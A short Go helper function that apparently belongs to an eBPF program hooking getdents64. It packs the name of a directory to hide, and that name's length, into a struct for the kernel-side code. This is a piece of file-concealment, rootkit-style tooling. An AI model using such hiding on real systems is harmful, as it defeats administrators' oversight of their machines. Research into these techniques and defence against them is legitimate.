package main

// Use by the eBPF code to get information about the directory to hide and the length of the it's name
func NewUserspaceData(folder string) *getdents64UserspaceData {
	userspaceData := getdents64UserspaceData{}

	copy(userspaceData.DirnameToHide[:], folder)
	userspaceData.DirnameLen = int32(len(folder))

	return &userspaceData
}
